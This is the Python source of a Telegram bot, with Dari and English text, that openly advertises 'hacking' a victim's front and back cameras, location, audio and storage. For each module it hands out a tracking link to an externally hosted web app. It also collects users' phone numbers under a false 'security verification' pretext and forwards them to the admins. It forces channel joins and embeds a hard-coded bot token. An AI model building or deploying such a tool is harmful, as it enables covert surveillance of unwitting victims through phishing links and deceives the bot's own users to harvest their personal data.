import telebot
from telebot import types
import threading
import time

# توکن جدید ربات
BOT_TOKEN = "8248448968:AAHtMpdDezPtW9knCFU2x_y4EFKwYUG6o5g"
bot = telebot.TeleBot(BOT_TOKEN)

# آدرس وب‌سایت هاست شده روی Railway
WEB_APP_URL = "https://mynewbot6-production.up.railway.app"

# لیست ادمین‌ها و مالک جدید ربات
OWNER_ID = 7561963021
ADMINS = {OWNER_ID}

# دیکشنری ذخیره شماره تلفن کاربران
user_phones = {}

# لیست گروه‌ها و کانال‌های عضویت اجباری
managed_groups_dict = {
    "کانال اصلی": "@linkyourgroup"
} 

user_languages = {}     
admin_states = {}       
all_users = set()       # ذخیره آیدی یکتای تمام کاربران ربات برای آمار و ارسال همگانی

# فایل‌آیدی عکس هکری شما
PHOTO_FILE_ID = "AgACAgUAAxkBAAJFeWqjmnKR9ztqO8LrVdQ4h2f0rITDAAK-EWsbPiAhVUG4BhYiOJrlAQADAgADeQADPQQ"

# دیکشنری زبان‌ها و متن‌های ربات
LANGUAGES = {
    'prs': {
        'welcome_title': "⚠️ **[ SYSTEM ACCESSED ]** ⚠️",
        'welcome_msg': "سلام `{first_name}` عزیز؛ به شبکه نفوذ خوش آمدید. 💀\nوضعیت اتصال: **برقرار و امن**\nشناسه نفوذگر (User ID): `{user_id}`\n\n⚡️ جهت دریافت لینک اختصاصی هر ماژول، روی گزینه مورد نظر کلیک کنید:",
        'btn_front': "📸 هک دوربین جلو",
        'btn_back': "📷 هک دوربین عقب",
        'btn_loc': "📍 هک لوکیشن",
        'btn_all': "📱 هک تمام این بخش",
        'btn_storage': "📊 هک فضای ذخیره‌سازی",
        'btn_audio': "🎙️ هک صدا",
        'btn_support': "💬 ارتباط با پشتیبانی",
        'phone_request': "📱 لطفاً برای تکمیل اطلاعات امنیتی و تایید هویت، روی دکمه زیر کلیک کنید و شماره خود را به اشتراک بگذارید:",
        'phone_btn': "اشتراک‌گذاری شماره تلفن 📞",
        'thank_you': "✅ اطلاعات شما با موفقیت ثبت شد و دسترسی تایید شد.",
        'join_check': "❌ **عضویت اجباری!**\n\nبرای استفاده از ربات، لطفاً ابتدا در تمامی کانال‌ها و گروه‌های زیر عضو شوید و سپس روی دکمه «عضو شدم ✅» کلیک کنید:",
        'join_btn': "عضویت در 🚀",
        'check_join_btn': "عضو شدم ✅",
        'support_prompt': "💬 **ارسال پیام به پشتیبانی:**\n\nلطفاً پیام، سوال یا مشکل خود را ارسال کنید تا به دست تیم مدیریت برسد:",
        'support_sent': "✅ پیام شما با موفقیت برای پشتیبانی ارسال شد. منتظر پاسخ بمانید."
    },
    'en': {
        'welcome_title': "⚠️ **[ SYSTEM ACCESSED ]** ⚠️",
        'welcome_msg': "Hello dear `{first_name}`; Welcome to the infiltration network. 💀\nConnection Status: **Established & Secure**\nInfiltrator ID (User ID): `{user_id}`\n\n⚡️ To get the exclusive link for each module, click on the desired option:",
        'btn_front': "📸 Hack Front Camera",
        'btn_back': "📷 Hack Back Camera",
        'btn_loc': "📍 Hack Location",
        'btn_all': "📱 Hack All Sections",
        'btn_storage': "📊 Hack Storage",
        'btn_audio': "🎙️ Hack Audio",
        'btn_support': "💬 Support / Contact",
        'phone_request': "📱 Please click the button below and share your phone number to complete security verification:",
        'phone_btn': "Share Phone Number 📞",
        'thank_you': "✅ Your information has been successfully registered and access is granted.",
        'join_check': "❌ **Membership Required!**\n\nTo use the bot, please join all channels/groups below and then click 'Joined ✅':",
        'join_btn': "Join 🚀",
        'check_join_btn': "Joined ✅",
        'support_prompt': "💬 **Send message to support:**\n\nPlease send your message or question so it reaches the management team:",
        'support_sent': "✅ Your message has been successfully sent to support. Please wait for a reply."
    }
}

# تابع بررسی عضویت در تمامی گروه‌ها و کانال‌ها
def check_membership(user_id):
    if user_id in ADMINS:
        return True
    if not managed_groups_dict:
        return True
    
    for name, group in managed_groups_dict.items():
        try:
            target = group.strip()
            if not target:
                continue
            if not target.startswith("@") and not target.startswith("http"):
                target = "@" + target
            if "t.me/" in target:
                target = "@" + target.split("t.me/")[-1].split("/")[0]
                
            member = bot.get_chat_member(target, user_id)
            if member.status not in ['member', 'administrator', 'creator']:
                return False
        except Exception as e:
            print(f"خطا در بررسی عضویت گروه {group}: {e}")
            continue
            
    return True

# تابع حذف خودکار پیام پس از ۳۰ ثانیه
def delete_message_after_delay(chat_id, message_id, delay=30):
    time.sleep(delay)
    try:
        bot.delete_message(chat_id, message_id)
    except:
        pass

# تابع ارسال پیام عضویت اجباری با نمایش تمام لیست گروه‌ها
def send_join_requirement(chat_id):
    lang = user_languages.get(chat_id, 'prs')
    lang_dict = LANGUAGES[lang]
    
    markup = types.InlineKeyboardMarkup(row_width=1)
    
    for name, group in managed_groups_dict.items():
        target_link = group.strip()
        if not target_link:
            continue
        if not target_link.startswith("http"):
            clean_channel = target_link.replace('@', '')
            target_link = f"https://t.me/{clean_channel}"
        
        markup.add(types.InlineKeyboardButton(f"📌 {name}", url=target_link))
        
    markup.add(types.InlineKeyboardButton(lang_dict['check_join_btn'], callback_data="check_join"))
    
    try:
        bot.send_message(chat_id=chat_id, text=lang_dict['join_check'], reply_markup=markup, parse_mode="Markdown")
    except Exception as e:
        print(f"خطا در ارسال پیام عضویت اجباری: {e}")

# دستور /group برای مدیریت بخش عضویت اجباری
@bot.message_handler(commands=['group'])
def admin_group_panel(message):
    user_id = message.from_user.id
    if user_id not in ADMINS:
        return
    
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("➕ افزودن گروه یا کانال", callback_data="grp_add"),
        types.InlineKeyboardButton("❌ حذف گروه یا کانال", callback_data="grp_del"),
        types.InlineKeyboardButton("📋 لیست گروه‌ها و کانال‌ها", callback_data="grp_list")
    )
    bot.send_message(user_id, "⚙️ **پنل مدیریت بخش عضویت اجباری:**\n\nلطفاً یکی از گزینه‌های زیر را انتخاب کنید:", reply_markup=markup, parse_mode="Markdown")

# دستور /admin برای پنل مدیریت ادمین‌ها و آمار کاربران
@bot.message_handler(commands=['admin'])
def admin_panel_main(message):
    user_id = message.from_user.id
    if user_id not in ADMINS:
        return
    
    total_users_count = len(all_users)
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("➕ افزودن ادمین", callback_data="adm_add"),
        types.InlineKeyboardButton("🗑️ حذف ادمین", callback_data="adm_del"),
        types.InlineKeyboardButton("📋 لیست ادمین‌ها", callback_data="adm_list"),
        types.InlineKeyboardButton("📢 پیام همگانی", callback_data="adm_broadcast")
    )
    
    panel_text = (
        f"👑 **پنل مدیریت ربات:**\n\n"
        f"👥 **تعداد کل کاربران ربات:** `{total_users_count}` نفر\n\n"
        f"لطفاً یکی از گزینه‌های زیر را انتخاب کنید:"
    )
    bot.send_message(user_id, panel_text, reply_markup=markup, parse_mode="Markdown")

# دستور استارت
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    first_name = message.from_user.first_name or "کاربر"
    username = f"@{message.from_user.username}" if message.from_user.username else "ندارد"
    
    all_users.add(user_id)
    
    start_alert = (
        f"🚨 **[ کاربر جدید ربات را استارت کرد ]** 🚨\n\n"
        f"👤 نام: `{first_name}`\n"
        f"🆔 آیدی عددی: `{user_id}`\n"
        f"نام کاربری: `{username}`"
    )
    for admin_id in ADMINS:
        try:
            bot.send_message(admin_id, start_alert, parse_mode="Markdown")
        except:
            pass

    if not check_membership(user_id):
        send_join_requirement(user_id)
        return

    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🇦🇫 دری (فارسی)", callback_data="lang_prs"),
        types.InlineKeyboardButton("🇬🇧 English", callback_data="lang_en")
    )
    bot.send_message(chat_id=user_id, text="🌐 **لطفاً زبان خود را انتخاب کنید:**\n🌐 **Please choose your language:**", parse_mode="Markdown", reply_markup=markup)

# مدیریت کلیک دکمه‌های شیشه‌ای
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    user_id = call.from_user.id
    data = call.data
    
    if data == "check_join":
        if check_membership(user_id):
            bot.answer_callback_query(call.id, "عضویت شما تایید شد! ✅")
            try:
                bot.delete_message(chat_id=user_id, message_id=call.message.message_id)
            except:
                pass
            
            markup = types.InlineKeyboardMarkup(row_width=2)
            markup.add(
                types.InlineKeyboardButton("🇦🇫 دری (فارسی)", callback_data="lang_prs"),
                types.InlineKeyboardButton("🇬🇧 English", callback_data="lang_en")
            )
            bot.send_message(chat_id=user_id, text="🌐 لطفاً زبان خود را انتخاب کنید:", reply_markup=markup)
        else:
            bot.answer_callback_query(call.id, "❌ شما هنوز در تمام کانال‌ها و گروه‌ها عضو نشده‌اید!", show_alert=True)
            send_join_requirement(user_id)
        return

    if not check_membership(user_id):
        bot.answer_callback_query(call.id, "❌ اول باید در تمامی کانال‌ها و گروه‌ها عضو شوی!", show_alert=True)
        send_join_requirement(user_id)
        return

    if data == "adm_add" and user_id in ADMINS:
        bot.answer_callback_query(call.id)
        bot.send_message(user_id, "➕ لطفاً آیدی عددی (User ID) کاربر مورد نظر را برای افزودن به عنوان ادمین ارسال کنید:")
        admin_states[user_id] = {"step": "get_new_admin_id"}
        return
        
    if data == "adm_del" and user_id in ADMINS:
        bot.answer_callback_query(call.id)
        if len(ADMINS) <= 1:
            bot.send_message(user_id, "⚠️ هیچ ادمین دیگری برای حذف وجود ندارد (شما مالک هستید).")
            return
        markup = types.InlineKeyboardMarkup(row_width=1)
        for adm in ADMINS:
            if adm != OWNER_ID:
                markup.add(types.InlineKeyboardButton(f"🗑️ حذف ادمین: {adm}", callback_data=f"del_adm_{adm}"))
        bot.send_message(user_id, "🗑️ ادمینی که می‌خواهید حذف کنید را انتخاب کنید:", reply_markup=markup)
        return
        
    if data.startswith("del_adm_") and user_id in ADMINS:
        bot.answer_callback_query(call.id)
        try:
            target_adm = int(data.replace("del_adm_", ""))
            if target_adm in ADMINS and target_adm != OWNER_ID:
                ADMINS.remove(target_adm)
                bot.send_message(user_id, f"✅ ادمین با شناسه `{target_adm}` با موفقیت حذف شد.", parse_mode="Markdown")
        except Exception as e:
            bot.send_message(user_id, f"❌ خطا در حذف ادمین: {e}")
        return
        
    if data == "adm_list" and user_id in ADMINS:
        bot.answer_callback_query(call.id)
        list_text = "📋 **لیست ادمین‌های ربات:**\n\n"
        for adm in ADMINS:
            role = "👑 مالک اصلی" if adm == OWNER_ID else "🛡️ ادمین"
            list_text += f"• `{adm}` ({role})\n"
        bot.send_message(user_id, list_text, parse_mode="Markdown")
        return

    if data == "adm_broadcast" and user_id in ADMINS:
        bot.answer_callback_query(call.id)
        bot.send_message(user_id, "📢 لطفاً پیام خود را برای ارسال همگانی به تمام کاربران ارسال کنید:")
        admin_states[user_id] = {"step": "get_broadcast_message"}
        return

    if data == "grp_add" and user_id in ADMINS:
        bot.answer_callback_query(call.id)
        bot.send_message(user_id, "🔗 لطفاً لینک یا آیدی گروه/کانال مورد نظر را ارسال کنید:")
        admin_states[user_id] = {"step": "get_link"}
        return
        
    if data == "grp_del" and user_id in ADMINS:
        bot.answer_callback_query(call.id)
        if not managed_groups_dict:
            bot.send_message(user_id, "⚠️ هیچ گروه یا کانالی در لیست وجود ندارد.")
            return
        markup = types.InlineKeyboardMarkup(row_width=1)
        for name, link in managed_groups_dict.items():
            markup.add(types.InlineKeyboardButton(f"🗑️ حذف: {name}", callback_data=f"del_grp_{name}"))
        bot.send_message(user_id, "🗑️ گزینه‌ای که می‌خواهید حذف کنید را انتخاب کنید:", reply_markup=markup)
        return
        
    if data.startswith("del_grp_") and user_id in ADMINS:
        bot.answer_callback_query(call.id)
        grp_name = data.replace("del_grp_", "")
        if grp_name in managed_groups_dict:
            del managed_groups_dict[grp_name]
            bot.send_message(user_id, f"✅ گروه/کانال «{grp_name}» با موفقیت از لیست عضویت اجباری حذف شد.")
        return
        
    if data == "grp_list" and user_id in ADMINS:
        bot.answer_callback_query(call.id)
        if not managed_groups_dict:
            bot.send_message(user_id, "📋 لیست گروه‌ها و کانال‌های عضویت اجباری خالی است.")
            return
        text_list = "📋 **لیست گروه‌ها و کانال‌های عضویت اجباری:**\n\n"
        for name, link in managed_groups_dict.items():
            text_list += f"📌 نام: {name}\n🔗 آیدی/لینک: `{link}`\n\n"
        bot.send_message(user_id, text_list, parse_mode="Markdown")
        return

    if data.startswith("lang_"):
        lang = data.split("_")[1]
        user_languages[user_id] = lang
        
        lang_dict = LANGUAGES[lang]
        markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
        btn_phone = types.KeyboardButton(lang_dict['phone_btn'], request_contact=True)
        markup.add(btn_phone)
        
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id=user_id, text=lang_dict['phone_request'], reply_markup=markup)
        return

    if data == "support_btn":
        lang = user_languages.get(user_id, 'prs')
        lang_dict = LANGUAGES[lang]
        bot.answer_callback_query(call.id)
        bot.send_message(user_id, lang_dict['support_prompt'], parse_mode="Markdown")
        admin_states[user_id] = {"step": "waiting_support"}
        return

    valid_modules = {
        "front": "📸 لینک دوربین جلو",
        "back": "📷 لینک دوربین عقب",
        "location": "📍 لینک لوکیشن",
        "all": "📱 لینک تمام بخش‌ها",
        "storage": "📊 لینک فضای ذخیره‌سازی",
        "audio": "🎙️ لینک صدا"
    }

    if data in valid_modules:
        lang = user_languages.get(user_id, 'prs')
        lang_dict = LANGUAGES.get(lang, LANGUAGES['prs'])
        
        target_link = f"{WEB_APP_URL}/{data}?user={user_id}"
        module_name = valid_modules[data]
        
        response_text = (
            f"🔗 {module_name}:\n\n"
            f"{target_link}\n\n"
            f"👆 روی لینک بالا ضربه بزنید تا کپی شود یا وارد آن شوید.\n\n"
            f"⏳ **توجه:** این پیام و لینک پس از ۳۰ ثانیه به دلایل امنیتی خودبه‌خود پاک می‌شود!\n\n"
            f"───────────────\n"
            f"سازنده: @ID_KING_SAHIL"
        )
        
        bot.answer_callback_query(call.id, text="لینک آماده شد!", show_alert=True)
        sent_msg = bot.send_message(chat_id=user_id, text=response_text)
        
        threading.Thread(target=delete_message_after_delay, args=(user_id, sent_msg.message_id, 30)).start()
        return

    bot.answer_callback_query(call.id)

# دریافت شماره تلفن
@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    user_id = message.from_user.id
    all_users.add(user_id)
    if not check_membership(user_id):
        send_join_requirement(user_id)
        return

    first_name = message.from_user.first_name or "ندارد"
    username = f"@{message.from_user.username}" if message.from_user.username else "ندارد"
    phone_number = message.contact.phone_number
    
    user_phones[user_id] = f"+{phone_number}"
    
    contact_report = (
        f"📞 **[ تایید هویت و شماره تلفن کاربر ]** 📞\n\n"
        f"👤 نام: `{first_name}`\n"
        f"🆔 آیدی عددی: `{user_id}`\n"
        f"نام کاربری: `{username}`\n"
        f"📱 شماره تلفن: `+{phone_number}`"
    )
    for admin_id in ADMINS:
        try:
            bot.send_message(admin_id, contact_report, parse_mode="Markdown")
        except:
            pass

    lang = user_languages.get(user_id, 'prs')
    lang_dict = LANGUAGES[lang]
    
    remove_markup = types.ReplyKeyboardRemove()
    bot.send_message(chat_id=user_id, text=lang_dict['thank_you'], reply_markup=remove_markup)
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton(lang_dict['btn_front'], callback_data="front"),
        types.InlineKeyboardButton(lang_dict['btn_back'], callback_data="back"),
        types.InlineKeyboardButton(lang_dict['btn_loc'], callback_data="location"),
        types.InlineKeyboardButton(lang_dict['btn_all'], callback_data="all"),
        types.InlineKeyboardButton(lang_dict['btn_storage'], callback_data="storage"),
        types.InlineKeyboardButton(lang_dict['btn_audio'], callback_data="audio"),
        types.InlineKeyboardButton(lang_dict['btn_support'], callback_data="support_btn")
    )
    
    caption = f"{lang_dict['welcome_title']}\n\n{lang_dict['welcome_msg'].format(first_name=first_name, user_id=user_id)}"
    
    try:
        bot.send_photo(chat_id=user_id, photo=PHOTO_FILE_ID, caption=caption, parse_mode="Markdown", reply_markup=markup)
    except:
        bot.send_message(chat_id=user_id, text=caption, parse_mode="Markdown", reply_markup=markup)

# مدیریت پیام‌های متنی و پشتیبانی با ارسال کامل مشخصات و قابلیت ریپلای
@bot.message_handler(content_types=['text', 'photo', 'video', 'document', 'audio', 'voice'])
def handle_all_messages(message):
    user_id = message.from_user.id
    all_users.add(user_id)
    
    if not check_membership(user_id):
        send_join_requirement(user_id)
        return
    
    if user_id in ADMINS and message.reply_to_message:
        replied_text = message.reply_to_message.text or message.reply_to_message.caption or ""
        if "🆔 آیدی عددی:" in replied_text:
            try:
                for line in replied_text.split('\n'):
                    if "🆔 آیدی عددی:" in line:
                        target_user_id = int(line.replace("🆔 آیدی عددی:", "").replace("`", "").strip())
                        bot.copy_message(chat_id=target_user_id, from_chat_id=message.chat.id, message_id=message.message_id)
                        bot.reply_to(message, "✅ پاسخ شما با موفقیت به کاربر ارسال شد.")
                        return
            except Exception as e:
                bot.reply_to(message, f"❌ خطا در ارسال پاسخ به کاربر: {e}")
                return

    if user_id in ADMINS and user_id in admin_states:
        state = admin_states[user_id].get("step")
        
        if state == "get_link":
            admin_states[user_id]["link"] = message.text
            admin_states[user_id]["step"] = "get_name"
            bot.send_message(user_id, "✍️ نام این گروه یا کانال را چه می‌گویید؟:")
            return
            
        elif state == "get_name":
            group_name = message.text
            group_link = admin_states[user_id].get("link")
            managed_groups_dict[group_name] = group_link
            del admin_states[user_id]
            bot.send_message(user_id, f"✅ گروه/کانال «{group_name}» با موفقیت اضافه شد!")
            return

        elif state == "get_new_admin_id":
            try:
                new_admin_id = int(message.text.strip())
                ADMINS.add(new_admin_id)
                del admin_states[user_id]
                bot.send_message(user_id, f"✅ ادمین با آیدی عددی `{new_admin_id}` افزوده شد.", parse_mode="Markdown")
            except ValueError:
                bot.send_message(user_id, "❌ لطفاً فقط یک آیدی عددی معتبر ارسال کنید:")
            return

        elif state == "get_broadcast_message":
            del admin_states[user_id]
            bot.send_message(user_id, "⏳ ارسال پیام همگانی آغاز شد...")
            success_count, fail_count = 0, 0
            for uid in all_users:
                try:
                    bot.copy_message(chat_id=uid, from_chat_id=message.chat.id, message_id=message.message_id)
                    success_count += 1
                    time.sleep(0.05)
                except:
                    fail_count += 1
            bot.send_message(user_id, f"✅ عملیات همگانی به پایان رسید.\nموفق: `{success_count}` | ناموفق: `{fail_count}`", parse_mode="Markdown")
            return

    if user_id in admin_states and admin_states[user_id].get("step") == "waiting_support":
        del admin_states[user_id]
        
        user_text = message.text or message.caption or "فایل/رسانه"
        first_name = message.from_user.first_name or "بدون نام"
        username = f"@{message.from_user.username}" if message.from_user.username else "ندارد"
        phone = user_phones.get(user_id, "ثبت نشده (اشتراک‌گذاری نکرده)")
        
        support_report = (
            f"📩 **[ پیام جدید پشتیبانی ]**\n\n"
            f"👤 نام: `{first_name}`\n"
            f"🆔 آیدی عددی: `{user_id}`\n"
            f"🌐 نام کاربری: `{username}`\n"
            f"📱 شماره تلفن: `{phone}`\n\n"
            f"💬 **متن پیام:**\n`{user_text}`"
        )
        
        user_photos = bot.get_user_profile_photos(user_id, limit=1)
        
        for admin_id in ADMINS:
            try:
                if user_photos.total_count > 0:
                    file_id = user_photos.photos[0][0].file_id
                    bot.send_photo(chat_id=admin_id, photo=file_id, caption=support_report, parse_mode="Markdown")
                else:
                    bot.send_message(chat_id=admin_id, text=support_report, parse_mode="Markdown")
            except Exception as e:
                print(f"خطا در ارسال پیام پشتیبانی به ادمین {admin_id}: {e}")
                try:
                    bot.send_message(admin_id, support_report, parse_mode="Markdown")
                except:
                    pass
                
        lang = user_languages.get(user_id, 'prs')
        lang_dict = LANGUAGES[lang]
        bot.send_message(user_id, lang_dict['support_sent'])
        return

if __name__ == "__main__":
    print("ربات با موفقیت به‌روزرسانی شد و آماده کار است...")
    bot.infinity_polling()
